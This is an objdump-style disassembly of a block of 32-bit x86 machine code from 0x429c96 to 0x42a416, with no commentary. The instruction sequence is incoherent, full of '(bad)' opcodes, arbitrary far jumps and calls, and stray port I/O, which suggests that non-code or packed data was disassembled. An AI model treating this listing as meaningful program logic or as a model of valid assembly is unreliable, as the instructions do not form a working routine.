  429c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429c97:	push   edx
  429c98:	mov    eax,ds:0xa6c54b04
  429c9d:	mov    ebp,DWORD PTR [ecx]
  429c9f:	mov    ebp,0xd2fca325
  429ca4:	push   esi
  429ca5:	mov    ch,0x79
  429ca7:	fwait
  429ca8:	jnp    0x429c3c
  429caa:	add    BYTE PTR [esi-0x75e4c006],ch
  429cb0:	dec    ebp
  429cb1:	jno    0x429c54
  429cb3:	adc    al,0x13
  429cb5:	fcom   QWORD PTR [edi-0x2434e810]
  429cbb:	push   esi
  429cbc:	push   ebx
  429cbd:	add    al,0x47
  429cbf:	xor    BYTE PTR [ebx-0x47a30426],bh
  429cc5:	adc    eax,0xe62c6c6e
  429cca:	js     0x429cf1
  429ccc:	fisub  DWORD PTR [ecx-0x6e]
  429ccf:	or     BYTE PTR [ebx-0x29249130],bh
  429cd5:	and    DWORD PTR [ecx],edx
  429cd7:	sub    ah,BYTE PTR [esi]
  429cd9:	popa   
  429cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429cdb:	jecxz  0x429c8e
  429cdd:	or     esp,DWORD PTR [ecx-0x84a4b46]
  429ce3:	lock and al,BYTE PTR [edi-0x4c495011]
  429cea:	or     dl,BYTE PTR [esi+0x6b97b0a8]
  429cf0:	(bad)  
  429cf1:	jne    0x429d1e
  429cf3:	or     eax,0xa23a16d8
  429cf8:	mov    ah,0x55
  429cfa:	mov    ch,0x89
  429cfc:	push   0x97001793
  429d01:	mov    bh,0x45
  429d03:	xor    eax,0x7d37001f
  429d08:	lahf   
  429d09:	repz jmp 0x429cb7
  429d0c:	pop    ebx
  429d0d:	pop    ebx
  429d0e:	popw   ss
  429d10:	mov    ah,0x8e
  429d12:	pop    edx
  429d13:	cld    
  429d14:	adc    ebp,eax
  429d16:	jl     0x429d1c
  429d18:	mov    bh,0xb6
  429d1a:	jno    0x429ccd
  429d1c:	sbb    esi,esi
  429d1e:	xlat   BYTE PTR ds:[ebx]
  429d1f:	sahf   
  429d20:	dec    ebp
  429d21:	lahf   
  429d22:	push   ds
  429d23:	fstp   TBYTE PTR [edx]
  429d25:	push   0x4422dd03
  429d2a:	sub    dl,dl
  429d2c:	ficom  DWORD PTR [ebp+0x10352d95]
  429d32:	je     0x429d2b
  429d34:	dec    eax
  429d35:	arpl   WORD PTR [edx],ax
  429d37:	pop    esp
  429d38:	push   edi
  429d39:	ins    BYTE PTR es:[edi],dx
  429d3a:	mov    bh,0xad
  429d3c:	push   ecx
  429d3d:	xchg   ecx,eax
  429d3e:	and    BYTE PTR [eax],ch
  429d40:	xchg   ebp,eax
  429d41:	test   al,0xb9
  429d43:	jp     0x429d09
  429d45:	ins    DWORD PTR es:[edi],dx
  429d46:	inc    eax
  429d47:	dec    ebp
  429d48:	push   esp
  429d49:	mov    WORD PTR es:0x76c05574,cs
  429d50:	mov    ds:0xf03469b0,eax
  429d55:	out    0x96,al
  429d57:	mov    ah,0xb1
  429d59:	mov    ah,0xd4
  429d5b:	(bad)  
  429d5d:	in     al,dx
  429d5e:	fld    QWORD PTR [edi+0x58]
  429d61:	ret    
  429d62:	mov    dl,0x81
  429d64:	ins    DWORD PTR es:[edi],dx
  429d65:	jae    0x429d1b
  429d67:	(bad)  
  429d69:	pop    eax
  429d6a:	cmc    
  429d6b:	pop    ecx
  429d6c:	and    ebp,eax
  429d6e:	daa    
  429d6f:	mov    al,ch
  429d71:	push   es
  429d72:	lods   eax,DWORD PTR ds:[esi]
  429d73:	dec    edi
  429d74:	cmp    BYTE PTR [ebx],0xe0
  429d77:	in     eax,dx
  429d78:	lods   eax,DWORD PTR ds:[esi]
  429d79:	or     eax,0xd92feb62
  429d7e:	aam    0x83
  429d80:	stc    
  429d81:	aam    0xb5
  429d83:	inc    esp
  429d84:	mov    cl,0x83
  429d86:	and    bl,0x44
  429d89:	neg    ah
  429d8b:	cs ins DWORD PTR es:[edi],dx
  429d8d:	sub    al,0x35
  429d8f:	ja     0x429dfd
  429d91:	xor    ch,BYTE PTR ds:0x675f4ab7
  429d97:	nop
  429d98:	fcmovu st,st(2)
  429d9a:	push   es
  429d9b:	fdivr  st,st(6)
  429d9d:	sub    eax,0x20897aa6
  429da2:	and    eax,DWORD PTR [ebx]
  429da4:	sub    eax,0xac0d6d51
  429da9:	sahf   
  429daa:	jge    0x429d6c
  429dac:	into   
  429dad:	jo     0x429d50
  429daf:	frstor [edx-0x5debbad4]
  429db5:	adc    DWORD PTR [ebx],ebp
  429db7:	es (bad) 
  429db9:	or     edx,DWORD PTR [ebp-0x45]
  429dbc:	jge    0x429df6
  429dbe:	jmp    0x3a92:0x95ac3e44
  429dc5:	mov    bh,0x25
  429dc7:	retf   0x3845
  429dca:	les    eax,FWORD PTR [edi-0x51de7d23]
  429dd0:	sbb    BYTE PTR [ebp+0x14],0xeb
  429dd4:	jmp    0x80e907fb
  429dd9:	mov    dh,0xa8
  429ddb:	or     bh,BYTE PTR [edi]
  429ddd:	into   
  429dde:	loopne 0x429de4
  429de0:	fst    QWORD PTR [esi]
  429de2:	fiadd  DWORD PTR [edi]
  429de4:	int3   
  429de5:	fisubr DWORD PTR [ecx-0x604eb298]
  429deb:	(bad)  
  429dec:	push   edx
  429ded:	shl    BYTE PTR [esi],1
  429def:	jo     0x429d9d
  429df1:	fs mov bl,0x9c
  429df4:	inc    ebx
  429df5:	adc    BYTE PTR [esi+0x63],al
  429df8:	push   edi
  429df9:	aad    0x1a
  429dfb:	push   edx
  429dfc:	and    eax,DWORD PTR [ecx+0x3b6d248d]
  429e02:	call   0x3b27e7c9
  429e07:	js     0x429dac
  429e09:	je     0x429e5b
  429e0b:	dec    edx
  429e0c:	loop   0x429de9
  429e0e:	mov    dh,0xda
  429e10:	lods   eax,DWORD PTR ds:[esi]
  429e11:	(bad)  
  429e13:	enter  0x2cec,0x37
  429e17:	mov    ds:0x1abf3fef,al
  429e1c:	sub    bh,BYTE PTR [esi]
  429e1e:	jno    0x429e1a
  429e20:	and    ch,BYTE PTR [ebx]
  429e22:	imul   edx,DWORD PTR ss:[esi+0x6c050d97],0x8ed6bb17
  429e2d:	rcl    esp,1
  429e2f:	xchg   eax,eax
  429e31:	sub    eax,0xbd1bb5bf
  429e36:	mov    edi,0x23a4cb31
  429e3b:	jg     0x429e3d
  429e3d:	pop    edx
  429e3e:	adc    al,BYTE PTR [eax]
  429e40:	mov    esi,0x1351e375
  429e45:	ret    
  429e46:	sbb    BYTE PTR [ebx-0x42ff3ee4],0xc8
  429e4d:	ret    0x42d2
  429e50:	pop    ebx
  429e51:	xor    edx,DWORD PTR [edx]
  429e53:	fild   WORD PTR [ecx+0x8]
  429e56:	push   cs
  429e57:	dec    edi
  429e58:	imul   esp,DWORD PTR [ecx-0x228c2efc],0xffffffd6
  429e5f:	mov    DWORD PTR [esi+esi*1],0x2a768dd1
  429e66:	push   edx
  429e67:	loopne 0x429e6c
  429e69:	in     al,0x48
  429e6b:	leave  
  429e6c:	or     al,0x7a
  429e6e:	test   DWORD PTR [ebp+0x74af2a2e],eax
  429e74:	mov    BYTE PTR ds:0xae6e0a6d,al
  429e7a:	mov    dh,0xf8
  429e7c:	repnz cmp DWORD PTR [edx],eax
  429e7f:	fwait
  429e80:	jo     0x429ed7
  429e82:	jbe    0x429edf
  429e84:	fsubr  st,st(2)
  429e86:	pop    ecx
  429e87:	gs retf 0xa36d
  429e8b:	ins    BYTE PTR es:[edi],dx
  429e8c:	outs   dx,BYTE PTR ds:[esi]
  429e8d:	sub    BYTE PTR [eax],0x32
  429e90:	mov    dh,0xd1
  429e92:	ss stos BYTE PTR es:[edi],al
  429e94:	call   0x10a000de
  429e99:	mov    dh,0x6e
  429e9b:	or     ecx,DWORD PTR [ebx]
  429e9d:	fld    TBYTE PTR [ebx]
  429e9f:	adc    al,0x88
  429ea1:	pop    eax
  429ea2:	push   esi
  429ea3:	sub    ebx,ecx
  429ea5:	xlat   BYTE PTR ds:[ebx]
  429ea6:	push   esi
  429ea7:	add    eax,0xbadb75
  429eac:	ins    DWORD PTR es:[edi],dx
  429ead:	and    al,0x5c
  429eaf:	stos   BYTE PTR es:[edi],al
  429eb0:	in     al,dx
  429eb1:	or     al,0xa6
  429eb3:	test   al,0x6
  429eb5:	mov    al,ds:0xdbd9d51d
  429eba:	mov    ecx,0xabb114f5
  429ebf:	xchg   esi,eax
  429ec0:	xor    al,0x76
  429ec3:	pusha  
  429ec4:	xchg   esi,eax
  429ec5:	test   DWORD PTR [ebp-0x7595cafa],eax
  429ecb:	test   esi,edx
  429ecd:	nop
  429ece:	add    al,0xb
  429ed0:	pop    ebx
  429ed1:	push   edi
  429ed2:	les    ecx,FWORD PTR [ecx]
  429ed4:	push   esi
  429ed5:	mov    esp,0x198db31b
  429eda:	fbstp  TBYTE PTR [esi]
  429edc:	add    al,0xdd
  429ede:	sbb    al,0x33
  429ee0:	xchg   edx,eax
  429ee1:	sub    esi,DWORD PTR [esi]
  429ee3:	xchg   esp,eax
  429ee4:	and    eax,0x803b6b34
  429ee9:	fcmovb st,st(2)
  429eeb:	sub    eax,0xec01c21a
  429ef0:	inc    edi
  429ef1:	jbe    0x429f5c
  429ef3:	popa   
  429ef4:	imul   ebx,esp,0xd8cd8ee6
  429efa:	sahf   
  429efb:	sub    DWORD PTR [ebp+edi*2-0x3bee2bfe],esi
  429f02:	cs cwde 
  429f04:	dec    esp
  429f05:	bound  esi,QWORD PTR [esi]
  429f07:	inc    ebp
  429f08:	mov    bh,0x8d
  429f0a:	loope  0x429f63
  429f0c:	rol    DWORD PTR [ebx+0x66],1
  429f0f:	xchg   BYTE PTR [esi+0x1e],ch
  429f12:	push   edx
  429f13:	sub    eax,0xffffff88
  429f16:	stc    
  429f17:	shr    DWORD PTR [edi+0x17],1
  429f1a:	ins    DWORD PTR es:[edi],dx
  429f1b:	mov    eax,ds:0xf812eaa3
  429f20:	aad    0x1f
  429f22:	int    0xe2
  429f24:	mov    dh,0xc4
  429f26:	inc    edx
  429f27:	inc    edi
  429f28:	lds    ebp,FWORD PTR [edx+edx*1-0x77]
  429f2c:	push   0xb8a398d0
  429f31:	cdq    
  429f32:	or     dh,cl
  429f34:	jecxz  0x429eef
  429f36:	sbb    ch,BYTE PTR [eax-0x2a89dd5f]
  429f3c:	lods   eax,DWORD PTR ds:[esi]
  429f3d:	mov    DWORD PTR [ebx+eiz*1+0x78],eax
  429f41:	(bad)  
  429f42:	loop   0x429fa3
  429f44:	ins    DWORD PTR es:[edi],dx
  429f45:	push   edi
  429f46:	add    eax,0xcbbc8cbb
  429f4b:	mov    ecx,0xc61daa9c
  429f50:	lods   eax,DWORD PTR ds:[esi]
  429f51:	repnz or esp,edx
  429f54:	adc    DWORD PTR [ecx+0x52c4f100],ebp
  429f5a:	xchg   ebp,eax
  429f5b:	push   0x72
  429f5d:	pop    ss
  429f5e:	fmul   st,st(2)
  429f60:	(bad)  
  429f61:	push   eax
  429f62:	pop    ebp
  429f63:	pop    ds
  429f64:	or     ecx,ebp
  429f66:	jne    0x429f4f
  429f68:	ror    BYTE PTR [ebp-0x76d5a25e],1
  429f6e:	aam    0x38
  429f70:	push   eax
  429f71:	xchg   edx,eax
  429f72:	xchg   esp,eax
  429f73:	test   eax,0x18248d6e
  429f78:	ja     0x429f06
  429f7a:	shr    BYTE PTR [ecx],0x5
  429f7d:	ins    BYTE PTR es:[edi],dx
  429f7e:	rcl    DWORD PTR [esi+0x78],1
  429f81:	mov    al,0x4a
  429f83:	xchg   BYTE PTR [eax],ah
  429f85:	mov    edx,0x62fd35b0
  429f8a:	stos   BYTE PTR es:[edi],al
  429f8b:	add    DWORD PTR [ebx],edx
  429f8d:	xchg   edi,eax
  429f8e:	mov    esi,0x6b616176
  429f93:	(bad)  
  429f94:	sub    eax,0x48345ce9
  429f99:	push   ss
  429f9a:	jns    0x429f9a
  429f9c:	clc    
  429f9d:	inc    esi
  429f9e:	mov    ch,0x75
  429fa0:	lds    edx,FWORD PTR [esi*2+0x6a0bef7d]
  429fa7:	outs   dx,BYTE PTR ds:[esi]
  429fa8:	dec    ebp
  429fa9:	shr    DWORD PTR [ebp-0x4f42ac93],1
  429faf:	mov    ebx,0xe11ddc41
  429fb4:	adc    edi,DWORD PTR [ebx]
  429fb6:	sub    cl,BYTE PTR [edi-0x37680799]
  429fbc:	mov    bh,0x1c
  429fbe:	imul   ebp,ebx,0x7a36628a
  429fc4:	inc    ecx
  429fc5:	(bad)  
  429fc6:	adc    DWORD PTR es:[ebx],eax
  429fc9:	push   esp
  429fca:	(bad)  [esi+0x8]
  429fcd:	out    dx,al
  429fce:	in     al,dx
  429fcf:	cmc    
  429fd0:	push   0x146d1d2
  429fd5:	sbb    ebx,DWORD PTR [ebx-0x54]
  429fd8:	into   
  429fd9:	push   0x20eafa8
  429fde:	fiadd  DWORD PTR [ebp-0x30]
  429fe1:	scas   eax,DWORD PTR es:[edi]
  429fe2:	xor    BYTE PTR [edi+edi*1+0x3addb440],cl
  429fe9:	cdq    
  429fea:	ret    
  429feb:	outs   dx,BYTE PTR ds:[esi]
  429fec:	cwde   
  429fed:	test   al,bh
  429fef:	imul   ebx,DWORD PTR [edx],0xffffff82
  429ff2:	in     eax,dx
  429ff3:	(bad)  
  429ff4:	leave  
  429ff5:	xlat   BYTE PTR ds:[ebx]
  429ff6:	(bad)  
  429ff7:	out    dx,al
  429ff8:	push   edi
  429ff9:	and    cl,bl
  429ffb:	mov    esp,ebx
  429ffd:	(bad)  
  429ffe:	jb     0x42a06b
  42a000:	fcomp  QWORD PTR [eax+ecx*8-0x1]
  42a004:	lock out dx,eax
  42a006:	out    0x7c,al
  42a008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a009:	in     al,0x58
  42a00b:	or     BYTE PTR [esp+eax*8],0x3a
  42a00f:	cmp    eax,0xa8aed556
  42a014:	test   DWORD PTR [eax+0x4f],ebx
  42a017:	dec    ebx
  42a018:	cmp    DWORD PTR [ebx-0x5e],0xc04d1bfe
  42a01f:	(bad)  [edx+0x1d4e45a6]
  42a025:	ds add al,al
  42a028:	mov    al,ds:0xe23dc300
  42a02d:	add    ch,BYTE PTR [ebp+0x5b]
  42a030:	sub    DWORD PTR [esi+0x20],edx
  42a033:	xchg   edx,eax
  42a034:	xchg   esi,eax
  42a035:	in     eax,dx
  42a036:	pop    esp
  42a037:	sbb    eax,0x8a086d15
  42a03c:	out    dx,al
  42a03d:	out    0xcf,eax
  42a03f:	scas   eax,DWORD PTR es:[edi]
  42a040:	and    bl,dl
  42a042:	push   es
  42a043:	stos   BYTE PTR es:[edi],al
  42a044:	fwait
  42a045:	adc    esi,edx
  42a047:	test   eax,0x821a88fb
  42a04c:	push   ss
  42a04d:	adc    al,0x83
  42a04f:	jbe    0x42a060
  42a051:	(bad)  
  42a052:	mov    dh,0x6d
  42a054:	adc    eax,0x56f9a60f
  42a059:	sbb    al,0x83
  42a05b:	sbb    DWORD PTR [ebp-0x1dc493f0],eax
  42a061:	test   BYTE PTR [esi+0x35],dh
  42a064:	sub    BYTE PTR [ecx+0x8],bl
  42a067:	push   cs
  42a068:	shl    DWORD PTR [esi],1
  42a06a:	add    dh,BYTE PTR [esi]
  42a06c:	je     0x42a064
  42a06e:	cld    
  42a06f:	mov    edi,0x6a3bbf89
  42a074:	fist   DWORD PTR [ecx]
  42a076:	adc    al,0x4e
  42a078:	xor    BYTE PTR [ebx],bh
  42a07a:	sub    bl,bl
  42a07c:	fmul   DWORD PTR [edi+0x1d]
  42a07f:	add    esp,ebx
  42a081:	push   0xb3b3754a
  42a086:	jl     0x42a0ef
  42a088:	pop    ebp
  42a089:	adc    al,0x3b
  42a08b:	or     BYTE PTR [eax+ecx*8+0x5e],0x4d
  42a090:	retf   0x75ff
  42a093:	mov    ds:0xdf0ba88b,eax
  42a098:	lea    edi,[eax+0x3d]
  42a09b:	shr    dl,1
  42a09d:	or     ch,BYTE PTR [eax+0x7]
  42a0a0:	out    0xa1,al
  42a0a2:	mov    bl,BYTE PTR [edi]
  42a0a4:	jnp    0x42a030
  42a0a6:	xchg   BYTE PTR [eax+0x29],ah
  42a0a9:	sub    al,0x35
  42a0ab:	shl    eax,1
  42a0ad:	sub    BYTE PTR [esi-0x4c],0x25
  42a0b1:	add    ah,bl
  42a0b3:	xchg   edx,eax
  42a0b4:	arpl   ax,dx
  42a0b6:	out    dx,al
  42a0b7:	sub    ebx,eax
  42a0b9:	or     bh,BYTE PTR [ebx]
  42a0bb:	jne    0x42a044
  42a0bd:	std    
  42a0be:	xor    edi,ebp
  42a0c0:	and    al,0x74
  42a0c2:	adc    esp,ebp
  42a0c4:	sub    BYTE PTR [eax+0x4d],0x31
  42a0c8:	loopne 0x42a06c
  42a0ca:	ins    DWORD PTR es:[edi],dx
  42a0cb:	test   al,0x6e
  42a0cd:	dec    ebp
  42a0ce:	(bad)  
  42a0cf:	push   edi
  42a0d0:	gs (bad) 
  42a0d2:	mov    eax,0x1b721f3e
  42a0d7:	ins    DWORD PTR es:[edi],dx
  42a0d8:	mov    DWORD PTR [edx+0x2cb92002],esp
  42a0de:	ins    BYTE PTR es:[edi],dx
  42a0df:	fist   WORD PTR [esi]
  42a0e1:	cmp    BYTE PTR [edx-0x695a26f5],ah
  42a0e7:	leave  
  42a0e8:	xchg   esp,eax
  42a0e9:	stos   BYTE PTR es:[edi],al
  42a0ea:	mov    dh,0x6d
  42a0ec:	jecxz  0x42a14e
  42a0ee:	fnstsw WORD PTR [ebx+edx*2]
  42a0f1:	das    
  42a0f2:	int    0xf8
  42a0f4:	aam    0x2c
  42a0f6:	ins    BYTE PTR es:[edi],dx
  42a0f7:	add    BYTE PTR [ecx],bl
  42a0f9:	call   0xa9b6:0x44c2bd9
  42a100:	fsubr  DWORD PTR [esi]
  42a102:	scas   eax,DWORD PTR es:[edi]
  42a103:	(bad)  
  42a104:	imul   ecx,eax,0xd642a0ca
  42a10a:	clc    
  42a10b:	push   eax
  42a10c:	jne    0x42a122
  42a10e:	mov    bh,0x59
  42a110:	rcr    BYTE PTR [edi+0x52e2504d],cl
  42a116:	mov    DWORD PTR [eax+0x5fb3578f],esp
  42a11c:	sbb    eax,0x20edb4ad
  42a121:	pop    es
  42a122:	and    edx,edx
  42a124:	dec    BYTE PTR ds:0x75b66b83
  42a12a:	push   ebp
  42a12b:	mov    bh,0x3d
  42a12d:	mov    edi,0xa7bf6176
  42a132:	push   cs
  42a133:	mov    al,0xe0
  42a135:	sub    BYTE PTR [eax-0x113d293f],bh
  42a13b:	xchg   edx,eax
  42a13c:	fidiv  DWORD PTR [ebx]
  42a13e:	sub    ah,BYTE PTR [eax]
  42a140:	xor    dl,BYTE PTR [ecx+0x1b]
  42a143:	xchg   DWORD PTR [esi+edx*2-0x15],edi
  42a147:	mov    dh,0x35
  42a149:	add    al,0xdd
  42a14b:	inc    ecx
  42a14c:	mov    ds:0xf8074003,al
  42a151:	jle    0x42a1ca
  42a153:	inc    ecx
  42a154:	in     al,dx
  42a155:	and    dl,0x9c
  42a158:	push   ebp
  42a159:	or     eax,0x59
  42a15c:	push   es
  42a15d:	shl    BYTE PTR [esi+0xdef0cd0],1
  42a163:	xchg   esi,eax
  42a164:	es std 
  42a166:	les    ecx,FWORD PTR [eax-0x643ba2e5]
  42a16c:	hlt    
  42a16d:	inc    esp
  42a16e:	mov    bh,0x58
  42a170:	fist   DWORD PTR ds:0x1b03a370
  42a176:	test   eax,0x5a4e5427
  42a17b:	xor    BYTE PTR [edx],0xd0
  42a17e:	arpl   WORD PTR [esi],ax
  42a180:	aas    
  42a181:	mov    bl,0x99
  42a183:	je     0x42a1d5
  42a185:	mov    ah,0x89
  42a187:	int    0x7
  42a189:	mov    cl,0x88
  42a18b:	cwde   
  42a18c:	ins    DWORD PTR es:[edi],dx
  42a18d:	fwait
  42a18e:	mov    BYTE PTR [ebx],cl
  42a190:	cmp    al,0x52
  42a192:	push   esi
  42a193:	inc    edi
  42a194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a195:	test   eax,0x6b6d7daa
  42a19a:	imul   ebp,DWORD PTR [ebx+0x61],0x4c506dcb
  42a1a1:	jg     0x42a21a
  42a1a3:	add    al,BYTE PTR [edx-0x3f2bb24a]
  42a1a9:	mov    WORD PTR [eax+0x5c],ds
  42a1ac:	loopne 0x42a1a3
  42a1ae:	sbb    cl,BYTE PTR ds:0x920eb745
  42a1b4:	popf   
  42a1b5:	ja     0x42a167
  42a1b7:	mov    ds:0xa6d21fb,al
  42a1bc:	jmp    0xf487:0x83157312
  42a1c3:	sub    BYTE PTR [esi],0x28
  42a1c6:	xchg   esi,eax
  42a1c7:	das    
  42a1c8:	mov    bl,0xd1
  42a1ca:	add    BYTE PTR [ecx-0x72],cl
  42a1cd:	out    dx,al
  42a1ce:	int3   
  42a1cf:	mov    ah,0xb0
  42a1d1:	jne    0x42a1a8
  42a1d3:	and    DWORD PTR [esi],0x1c
  42a1d6:	inc    esp
  42a1d7:	mov    bl,0x37
  42a1d9:	mov    ecx,DWORD PTR [ebp+0x5d]
  42a1dc:	push   0x51551b0b
  42a1e1:	pop    eax
  42a1e2:	jne    0x42a1b8
  42a1e4:	and    eax,0x41c23abc
  42a1e9:	je     0x42a18e
  42a1eb:	out    dx,eax
  42a1ec:	shl    bh,0x1
  42a1ef:	rcl    DWORD PTR [esi-0x58],1
  42a1f2:	lea    ecx,[ebp-0x66813605]
  42a1f8:	sbb    al,0x83
  42a1fa:	fist   DWORD PTR [ecx]
  42a1fc:	sub    eax,0xe02694d5
  42a201:	mov    ah,0xf6
  42a203:	sti    
  42a204:	add    dh,BYTE PTR [eax+0x1b554a19]
  42a20a:	lods   al,BYTE PTR ds:[esi]
  42a20b:	pop    ss
  42a20c:	lahf   
  42a20d:	push   0x2a
  42a20f:	loop   0x42a1c7
  42a211:	sub    al,ch
  42a213:	outs   dx,BYTE PTR ds:[esi]
  42a214:	mov    ebp,0xbb57bc1d
  42a219:	aad    0x8
  42a21b:	pop    edx
  42a21c:	cmp    BYTE PTR [edi-0x37],ah
  42a21f:	mov    dl,0xdc
  42a221:	and    DWORD PTR ds:0x620bb007,esi
  42a227:	stos   BYTE PTR es:[edi],al
  42a228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a229:	fistp  DWORD PTR [edi]
  42a22b:	cmp    cl,ah
  42a22d:	inc    edx
  42a22e:	lea    ebp,[ebp+0x6d]
  42a231:	lahf   
  42a232:	repnz sub BYTE PTR [esi-0x5606d3bf],0x28
  42a23a:	mov    dh,0xed
  42a23c:	inc    edx
  42a23d:	ror    esp,0x3b
  42a240:	adc    al,0x15
  42a242:	loopne 0x42a248
  42a244:	fcmovnbe st,st(6)
  42a246:	add    eax,0xe74e59ed
  42a24b:	bound  esp,QWORD PTR [ebx]
  42a24d:	mov    DWORD PTR [eax-0x38],ebx
  42a250:	jb     0x42a2b1
  42a252:	adc    al,0x2d
  42a254:	mov    ah,0xab
  42a256:	(bad)  
  42a257:	std    
  42a258:	arpl   WORD PTR [eax+eiz*2+0x1b6e940b],di
  42a25f:	mov    cl,BYTE PTR [esi+0x771639b0]
  42a265:	xor    cl,al
  42a267:	ins    DWORD PTR es:[edi],dx
  42a268:	sbb    eax,0x6a1c0b0b
  42a26d:	(bad)  
  42a26e:	jl     0x42a2be
  42a270:	mov    eax,ds:0x35b547ef
  42a275:	add    DWORD PTR [eax+eiz*1+0x504ef0b8],esi
  42a27c:	leave  
  42a27d:	sub    BYTE PTR [esi],dh
  42a27f:	inc    eax
  42a280:	je     0x42a290
  42a282:	je     0x42a2b7
  42a284:	aaa    
  42a285:	lea    eax,[esi+0x47]
  42a288:	jo     0x42a275
  42a28a:	mov    ecx,0xda1c17b5
  42a28f:	adc    ebx,esp
  42a291:	mov    edx,0xe07410bb
  42a296:	out    0x38,eax
  42a298:	aad    0xeb
  42a29a:	cmp    BYTE PTR [edi+0x5b88296e],dl
  42a2a0:	arpl   WORD PTR [ebx],sp
  42a2a2:	dec    esi
  42a2a3:	ret    0x7a6
  42a2a6:	sub    ebx,DWORD PTR [eax-0x5e]
  42a2a9:	test   DWORD PTR [esi+0x3d834b5f],esi
  42a2af:	inc    edi
  42a2b0:	add    BYTE PTR [eax],ch
  42a2b2:	add    BYTE PTR [eax-0x15],dh
  42a2b5:	or     al,bh
  42a2b7:	mov    esp,0x9583665f
  42a2bc:	test   al,0x23
  42a2be:	ficom  DWORD PTR [ebp+0x69]
  42a2c1:	stc    
  42a2c2:	lock leave 
  42a2c4:	data16 mov ah,0x6d
  42a2c7:	ins    DWORD PTR es:[edi],dx
  42a2c8:	ins    BYTE PTR es:[edi],dx
  42a2c9:	or     dl,BYTE PTR [eax+0x4316126f]
  42a2cf:	mov    WORD PTR [edi+esi*4-0x5b],fs
  42a2d3:	mov    dh,0x5
  42a2d5:	mov    dh,0xd8
  42a2d7:	jge    0x42a32f
  42a2d9:	push   esi
  42a2da:	adc    DWORD PTR [esp+edi*2+0x37],ebp
  42a2de:	fmul   st,st(2)
  42a2e0:	push   ss
  42a2e1:	and    al,0xc7
  42a2e3:	stos   BYTE PTR es:[edi],al
  42a2e4:	inc    ebp
  42a2e5:	retf   
  42a2e6:	sbb    BYTE PTR [edx+ecx*4+0x5b],ah
  42a2ea:	sbb    eax,0x19460314
  42a2ef:	push   0xdc6b6926
  42a2f4:	call   0xa867:0x6fe9a95e
  42a2fb:	add    dl,BYTE PTR [ebp+edx*4+0x2a]
  42a2ff:	fadd   DWORD PTR [ebp+0x71]
  42a302:	or     al,0xb4
  42a304:	pop    ds
  42a305:	inc    esp
  42a306:	int    0x6e
  42a308:	sbb    eax,0xac5bed10
  42a30d:	std    
  42a30e:	stc    
  42a30f:	cmc    
  42a310:	inc    esp
  42a311:	popa   
  42a312:	push   edx
  42a313:	push   ss
  42a314:	mov    dh,0x26
  42a316:	sub    ah,bl
  42a318:	ret    
  42a319:	(bad)  
  42a31a:	sahf   
  42a31b:	mov    esi,0x688256ec
  42a320:	pop    ss
  42a321:	dec    edi
  42a322:	dec    eax
  42a323:	push   0xffffffcb
  42a325:	cs xchg ebp,eax
  42a327:	in     eax,dx
  42a328:	shl    BYTE PTR [esi+0x2faeddd4],cl
  42a32e:	xor    DWORD PTR [esi-0x8],0xffffffa8
  42a332:	inc    ebp
  42a333:	in     al,dx
  42a334:	fstp   QWORD PTR [edx]
  42a336:	sub    BYTE PTR [esi-0x175dc1c4],dh
  42a33c:	stos   BYTE PTR es:[edi],al
  42a33d:	gs lahf 
  42a33f:	lds    edx,FWORD PTR [ebp-0x1eabf292]
  42a345:	xchg   BYTE PTR [edx+eax*8-0x6],bl
  42a349:	push   0xb6e081b5
  42a34e:	and    ebx,DWORD PTR [esi]
  42a350:	mov    dh,0x40
  42a352:	inc    eax
  42a353:	(bad)  [edx-0x49249642]
  42a359:	dec    ebp
  42a35a:	fidivr DWORD PTR gs:[edx]
  42a35d:	adc    DWORD PTR [ecx],eax
  42a35f:	and    ebp,DWORD PTR ds:0x5bf5d7e6
  42a365:	fist   DWORD PTR [eax-0x10]
  42a368:	mov    ecx,0xcca861f5
  42a36d:	out    0x8f,al
  42a36f:	sbb    DWORD PTR [ebp-0x317df450],esi
  42a375:	pop    esp
  42a376:	add    eax,0xadc41048
  42a37b:	test   eax,0x62f54da0
  42a380:	call   0x54b90e2
  42a385:	add    eax,DWORD PTR [ecx]
  42a387:	fild   DWORD PTR [esi]
  42a389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a38a:	repnz inc edx
  42a38c:	dec    esp
  42a38d:	sub    eax,0x6d00342e
  42a392:	sbb    ch,BYTE PTR [edx]
  42a394:	mov    dh,0xaa
  42a396:	mov    ds:0xb455de97,eax
  42a39b:	sub    eax,0xa70a7534
  42a3a0:	add    ah,0x8a
  42a3a3:	sbb    eax,0x2fa1adc0
  42a3a8:	inc    ebp
  42a3a9:	cmp    edx,ecx
  42a3ab:	lock mov eax,0xabb5b0ad
  42a3b1:	or     al,0x8f
  42a3b3:	gs xor esp,esp
  42a3b6:	std    
  42a3b7:	lods   eax,DWORD PTR ds:[esi]
  42a3b8:	fcmovnb st,st(6)
  42a3ba:	rol    DWORD PTR [ebp+0x770f2eb0],cl
  42a3c0:	lods   eax,DWORD PTR ds:[esi]
  42a3c1:	icebp  
  42a3c2:	xor    BYTE PTR [edi-0x4d],dl
  42a3c5:	jo     0x42a398
  42a3c7:	lods   eax,DWORD PTR ds:[esi]
  42a3c8:	mov    ds:0x9e3e758a,eax
  42a3cd:	or     ebx,DWORD PTR [eax-0x24927faf]
  42a3d3:	add    eax,0xd76b2449
  42a3d8:	test   al,0xa7
  42a3da:	nop
  42a3db:	push   ss
  42a3dc:	mov    dh,0x8d
  42a3de:	push   es
  42a3df:	(bad)  
  42a3e0:	pop    ebx
  42a3e1:	scas   al,BYTE PTR es:[edi]
  42a3e2:	jnp    0x42a428
  42a3e4:	loop   0x42a3aa
  42a3e6:	fldenv [eax]
  42a3e8:	ficom  DWORD PTR [eax-0x24]
  42a3eb:	or     ch,BYTE PTR gs:[edx]
  42a3ee:	mov    bh,0xbf
  42a3f0:	mov    ds:0xbed82ae0,al
  42a3f5:	push   edx
  42a3f6:	or     DWORD PTR [eax],ecx
  42a3f8:	(bad)  
  42a3f9:	fild   WORD PTR [ebx]
  42a3fb:	in     eax,dx
  42a3fc:	mov    al,ds:0x948345b
  42a401:	(bad)  
  42a402:	dec    esp
  42a403:	lds    ebx,FWORD PTR [eax+0x6152d2c6]
  42a409:	mov    ecx,0xae3543c0
  42a40e:	mov    ecx,0x6d2b1ef6
  42a413:	sub    al,0x3a
  42a416:	xchg   edi,eax
